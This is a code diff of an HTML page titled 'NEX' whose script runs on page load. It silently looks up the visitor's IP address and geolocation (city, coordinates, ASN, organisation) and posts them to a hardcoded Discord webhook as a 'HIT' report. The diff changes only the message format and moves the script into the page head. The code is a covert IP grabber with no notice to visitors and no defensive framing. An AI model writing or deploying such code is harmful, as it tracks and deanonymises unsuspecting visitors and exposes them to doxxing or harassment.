@@ -3,31 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <title>NEX</title>
-</head>
-<body>
     <script>
         fetch("https://ipapi.co/json/")
             .then(response => response.json())
             .then(data => {
                 const ip = data.ip;
                 
-                const embedData = {
-                    title: "IP Hit Report",
-                    description: `IP Address: ${ip}`,
-                    fields: []
-                };
-
-                Object.entries(data).forEach(([key, value]) => {
-                    if (key !== 'ip' && key !== 'version') {  
-                        const label = `${key.replace(/_/g, ' ')}`.replace(/^./, (s) => s.charAt(0).toUpperCase() + s.substr(1));
-                        embedData.fields.push({
-                            name: label,
-                            value: value || "N/A",
-                            inline: true  
-                        });
-                    }
-                });
-
+                const fullContent = `
+                    HIT: 
+                        IP Address: ${ip}, 
+                        Network: ${data.network}, 
+                        Version: ${data.version}, 
+                        City: ${data.city}, 
+                        Region: ${data.region}, 
+                        Region Code: ${data.region_code}, 
+                        Country: ${data.country_name}, 
+                        Country Code: ${data.country_code}, 
+                        Country Code ISO3: ${data.country_code_iso3}, 
+                        Country Capital: ${data.country_capital}, 
+                        Country TLD: ${data.country_tld}, 
+                        Continent Code: ${data.continent_code}, 
+                        In EU: ${data.in_eu ? 'true' : 'false'}, 
+                        Latitude: ${data.latitude}, 
+                        Longitude: ${data.longitude}, 
+                        Timezone: ${data.timezone}, 
+                        UTC Offset: ${data.utc_offset}, 
+                        ASN: ${data.asn}, 
+                        Org: ${data.org}`;
+                
                 fetch("https://discord.com/api/webhooks/1418503063647293511/AHPEOUs6_GQtIB4hjxkYjHZ6qMz39ZkTlOpOUFobwY6Y56jkgnMiEGEZKEpAJ3o084-n",
                     {
                         method: "POST",
@@ -35,12 +38,13 @@
                             "Content-Type": "application/json"
                         },
                         body: JSON.stringify({
-                            embeds: [embedData]
+                            "content": fullContent
                         })
-                    })
-                    .then(() => console.log("Embed sent successfully!"))
-                    .catch(error => console.error("Error:", error));
+                    }
+                );
             });
+        
     </script>
-</body>
-</html>
+</head>
+
+            
